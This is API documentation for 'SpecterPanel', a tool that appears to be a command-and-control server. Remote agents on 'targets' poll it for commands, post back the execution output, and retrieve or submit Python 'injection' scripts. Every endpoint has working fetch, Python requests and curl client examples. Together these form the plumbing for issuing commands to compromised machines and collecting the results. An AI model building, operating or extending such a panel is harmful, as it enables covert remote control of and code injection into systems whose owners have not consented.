Introduction

Complete documentation for the SpecterPanel API, including both machine-facing endpoints (used by remote agents) and web-facing endpoints (used by the dashboard interface).

Authentication

All API requests require authentication via an API token:

  • GET requests: Include as query parameter ?token=ABC123
  • POST requests: Include in JSON body {"token":"ABC123"}

Base URL

All examples use SERVER as placeholder for your server's base URL.

GET /api/ApiCommand/<target_name>

Retrieve pending commands for a specific target. Remote agents should periodically poll this endpoint.

Parameters

NameTypeLocationRequiredDescription
tokenstringquery✓API token
target_namestringpath✓Target identifier
ipstringqueryAgent IP (optional)
osstringqueryAgent OS (optional)

Responses

200 Success 
{
  "allCommand": [["ID", "email", "target_name", "command", "condition", "update"], ...]
}
403 Invalid token 
{ "Error": "Invalid token" }
fetch('http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
  .then(response => response.json())
  .then(data => console.log(data));
import requests
params = {'token': 'ABC123', 'ip': '10.0.0.2', 'os': 'linux'}
response = requests.get('http://SERVER/api/ApiCommand/demo_target', params=params)
print(response.json())
curl -X GET "http://SERVER/api/ApiCommand/demo_target?token=ABC123&ip=10.0.0.2&os=linux"
POST /api/Apicommand/save_output

Submit command execution results back to the server.

Request Body (JSON)

NameTypeRequiredDescription
tokenstring✓API token
target_namestring✓Target identifier
outputarray✓Array of [command_id, output_text] pairs
 
fetch('http://SERVER/api/Apicommand/save_output', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    token: 'ABC123',
    target_name: 'demo_target',
    output: [["cmd123", "user123\\n"]]
  })
}).then(r => r.json()).then(console.log);
import requests
data = {'token':'ABC123','target_name':'demo_target','output':[['cmd123','user123\\n']]}
requests.post('http://SERVER/api/Apicommand/save_output', json=data)
curl -X POST "http://SERVER/api/Apicommand/save_output" -H "Content-Type: application/json" -d '{"token":"ABC123","target_name":"demo_target","output":[["cmd123","user123\\n"]]}'

GET/POST /api/injection/<target_name>

Retrieve or submit Python injection scripts.

// GET
fetch('http://SERVER/api/injection/demo_target?token=ABC123').then(r=>r.json()).then(console.log);
// POST
fetch('http://SERVER/api/injection/demo_target', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({token:'ABC123', code_output:'Injection completed'})
});
# GET
requests.get('http://SERVER/api/injection/demo_target', params={'token':'ABC123'}).json()
# POST
requests.post('http://SERVER/api/injection/demo_target', json={'token':'ABC123','code_output':'Injection completed'})
# GET
curl -X GET "http://SERVER/api/injection/demo_target?token=ABC123"
# POST
curl -X POST "http://SERVER/api/injection/demo_target" -H "Content-Type: application/json" -d '{"token":"ABC123","code_output":"Injection completed"}'

GET/POST /api_link

Manage API links. POST creates new API link (form data).

const fd = new FormData();
fd.append('target_name','demo_target');
fd.append('link','http://example.com/api');
fd.append('action_type','GET');
fetch('/api_link', {method:'POST', credentials:'include', body:fd});
session.post('http://SERVER/api_link', data={'target_name':'demo_target','link':'http://example.com/api','action_type':'GET'})
curl -b cookies.txt -X POST "http://SERVER/api_link" -F "target_name=demo_target" -F "link=http://example.com/api" -F "action_type=GET"
